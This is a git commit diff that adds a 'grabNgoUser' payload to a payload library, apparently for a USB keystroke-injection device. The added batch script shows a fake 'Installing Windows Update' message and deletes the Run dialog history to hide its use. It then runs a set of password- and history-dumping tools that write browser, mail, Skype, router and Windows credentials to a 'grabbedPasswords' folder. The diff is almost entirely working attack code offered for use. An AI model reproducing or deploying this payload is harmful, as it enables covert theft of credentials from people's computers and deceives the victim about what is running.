a776e735e14e403b83848f50e77268e52051eb02
PC Nurse <tomforti@verizon.net>
2017-03-10 08:17:10 -0500

    Added Support to target user computers.
    Place the grabNgoUser folder in payload folder and place the payload file in the switch folder

---
+++ payloads/library/grabNgo/grabNgoUser/d.cmd
@@ -0,0 +1,3 @@
+@echo off
+cscript %~dp0\i.vbs %~dp0\e.cmd
+@exit
---
+++ payloads/library/grabNgo/grabNgoUser/e.cmd
@@ -0,0 +1,53 @@
+@echo off
+REM will just look like and update is being done.
+@echo Installing Windows Update
+
+REM Delete registry keys storing Run dialog history
+REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+
+REM make a folder for where passwords will be stored. 
+set "$time=%time: =0%"
+set dst=%~dp0\grabbedPasswords\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%$time:~-11,2%%$time:~-8,2%%$time:~-5,2%
+mkdir %dst% >>nul
+
+REM runs all programs and grabs everything it can for password on the workstation.
+start %~dp0MrGraysRubberHack\WebBrowserPassView.exe /stext %dst%\WebBrowserPassView.txt
+start %~dp0MrGraysRubberHack\SkypeLogView.exe /stext %dst%\SkypeLogView.txt
+start %~dp0MrGraysRubberHack\RouterPassView.exe /stext %dst%\RouterPassView.txt
+start %~dp0MrGraysRubberHack\pspv.exe /stext %dst%\pspv.txt
+start %~dp0MrGraysRubberHack\PasswordFox.exe /stext %dst%\PasswordFox.txt
+start %~dp0MrGraysRubberHack\OperaPassView.exe /stext %dst%\OperaPassView.txt
+start %~dp0MrGraysRubberHack\mspass.exe /stext %dst%\mspass.txt
+start %~dp0MrGraysRubberHack\mailpv.exe /stext %dst%\mailpv.txt
+start %~dp0MrGraysRubberHack\iepv.exe /stext %dst%\iepv.txt
+start %~dp0MrGraysRubberHack\ChromePass.exe /stext %dst%\ChromePass.txt
+start %~dp0MrGraysRubberHack\ChromeHistoryView.exe /stext %dst%\ChromeHistoryView.txt
+start %~dp0MrGraysRubberHack\BulletsPassView.exe /stext %dst%\BulletsPassView.txt
+start %~dp0MrGraysRubberHack\BrowsingHistoryView.exe /stext %dst%\BrowsingHistoryView.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
